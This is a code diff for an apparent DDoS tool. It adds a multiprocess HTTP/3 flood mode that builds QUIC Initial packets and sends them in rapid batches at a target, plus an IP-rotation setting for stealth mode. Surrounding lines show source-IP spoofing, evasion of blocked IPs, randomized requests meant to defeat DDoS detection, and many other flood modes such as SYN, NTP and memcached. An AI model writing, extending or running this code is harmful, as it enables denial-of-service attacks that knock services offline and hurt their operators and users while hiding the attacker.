@@ -33,6 +33,7 @@ if _IS_WINDOWS:
 _SRC_IPS = [None]  # type: ignore  # active source IPs (list)
 _BLOCKED_IPS = set()  # IPs that received 429 (blocked by target)
 _JITTER = [0.0]  # Jitter delay in seconds, set by --jitter
+_ROTATE_INTERVAL = [5.0]  # IP rotation interval in seconds
 _SPOOF_MODE = [False]  # True = stealth mode (use spoofed IPs, hide real IP)
 _RECOVERY = [False]  # True = auto-replace blocked IPs
 _PROXY = [None]  # proxy URL: "http://host:port" or "socks5://user:pass@host:port"
@@ -1390,6 +1391,80 @@ async def quic_worker(name, url, stats, duration, stop, payload_size=1400):
     stats.packets += total
     stats.bytes += total * plen
 
+def _mp_h3_send(args_tuple):
+    """HTTP/3 flood: QUIC Initial packets with H3 SETTINGS + GET frames.
+    Different from quic (raw UDP) — this is protocol-level H3 request flood."""
+    import socket as _socket
+    import time as _time
+    import os as _os
+    import random as _rnd
+    host, port, duration = args_tuple
+    
+    s = _socket.socket(_socket.AF_INET, _socket.SOCK_DGRAM)
+    s.settimeout(1.0)
+    
+    # QUIC Initial packet header (long header, version 1)
+    # First byte: 0xC3 (long header, v1, DCID len=8)
+    # Version: 0x00000001 (QUIC v1)
+    # DCID: 8 random bytes
+    # SCID: 4 random bytes
+    # Packet number: 4 bytes
+    # Payload: H3 SETTINGS + GET frame
+    
+    # H3 SETTINGS frame (type 0x04, length, then settings)
+    h3_settings = bytes([0x04, 0x00, 0x00]) + b'\x00' * 8  # minimal SETTINGS
+    
+    # H3 GET request (type 0x00 HEADERS frame)
+    # Simplified: HEADERS frame with GET / HTTP/3
+    h3_get = bytes([0x00, 0x0a]) + b'GET / HTTP/3\r\n\r\n'
+    
+    # Build QUIC Initial packet
+    dcid = _os.urandom(8)
+    scid = _os.urandom(4)
+    pn = 0
+    # Long header: form(1)+fixed(1)+type(1)+lkf(1) = 0xC3
+    # Version: 0x00000001
+    # DCID len(1) + DCID(8)
+    # SCID len(1) + SCID(4)
+    # Packet number len(1) + PN(4)
+    quic_header = bytes([0xC3, 0x00, 0x00, 0x00, 0x01]) + bytes([8]) + dcid + bytes([4]) + scid
+    payload = h3_settings + h3_get
+    pkt = quic_header + bytes([4]) + _rnd.getrandbits(32).to_bytes(4, 'big') + payload
+    
+    end = _time.time() + duration
+    sent = 0
+    BATCH = 100
+    while _time.time() < end:
+        try:
+            for _ in range(BATCH):
+                # Randomize packet number
+                pn_bytes = _rnd.getrandbits(32).to_bytes(4, 'big')
+                pkt2 = pkt[:-len(payload)] + pn_bytes + payload
+                s.sendto(pkt2, (host, port))
+            sent += BATCH
+        except Exception:
+            break
+    s.close()
+    return sent
+
+async def h3mp_worker(name, url, stats, duration, stop, payload_size=1400):
+    """HTTP/3 multiprocess flood: QUIC Initial + H3 frames."""
+    host, port = parse_udp(url)
+    n_procs = max(1, min(32, _UDP_NPROCS[0]))
+    
+    import multiprocessing as mp
+    ctx = mp.get_context('spawn')
+    targets = [(host, port, duration)] * n_procs
+    pool = ctx.Pool(n_procs)
+    async_result = pool.map_async(_mp_h3_send, targets)
+    
+    results = await _wait_pool(pool, async_result, duration + 15)
+    if results is None:
+        results = [0] * n_procs
+    total = sum(results) if isinstance(results, list) else results
+    stats.packets += total
+    stats.bytes += total * 100  # approx H3 packet size
+
 # ── Raw HTTP: multiprocess raw socket (max RPS) ───────────────────
 def _random_http_req(host, path):
     """Generate a randomized HTTP request to defeat signature-based DDoS detection.
@@ -2054,6 +2129,7 @@ WORKERS = {
     'slowloris': slowloris_worker,
     'raw': raw_worker,
     'wsm': ws_mp_worker,
+    'h3mp': h3mp_worker,
 }
 
 DEFAULT_PAYLOADS = {
@@ -2228,7 +2304,7 @@ async def run(modes, url, conns, duration, stats, payload_size, args=None, mode_
         per_mode = max(1, _UDP_NPROCS[0] // n_l4)
         _UDP_NPROCS[0] = per_mode
     
-    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'dns', 'icmp', 'ssdp', 'ntp', 'memcached'}
+    MULTIPROC_MODES = {'udp', 'quic', 'syn', 'rst', 'fin', 'synack', 'tcp', 'raw', 'wsm', 'h2mp', 'h3mp', 'dns', 'icmp', 'ssdp', 'ntp', 'memcached'}
     for mode in modes:
         worker_fn = WORKERS[mode]
         pl = payload_size if payload_size is not None else DEFAULT_PAYLOADS.get(mode, 0)
@@ -2405,6 +2481,8 @@ examples:
         help="Stealth mode: only use spoofed IPs, never expose real IP")
     ap.add_argument("--jitter", type=float, default=0.0, metavar="MS",
         help="Random delay between requests in ms (0 = max speed, 5 = ~5ms jitter)")
+    ap.add_argument("--rotate-interval", type=float, default=5.0, metavar="SEC",
+        help="Seconds between IP rotation checks in stealth mode (default: 5s)")
     ap.add_argument("--recovery", action="store_true",
         help="Auto-recovery: detect 429 responses, remove blocked IPs, continue with remaining")
     ap.add_argument("--pool", default=None, metavar="FILE",
@@ -2465,6 +2543,7 @@ examples:
     # Initialize source IP rotation / spoofing
     _RECOVERY[0] = args.recovery
     _JITTER[0] = args.jitter / 1000.0
+    _ROTATE_INTERVAL[0] = args.rotate_interval
     if args.stealth:
         _SPOOF_MODE[0] = True
     
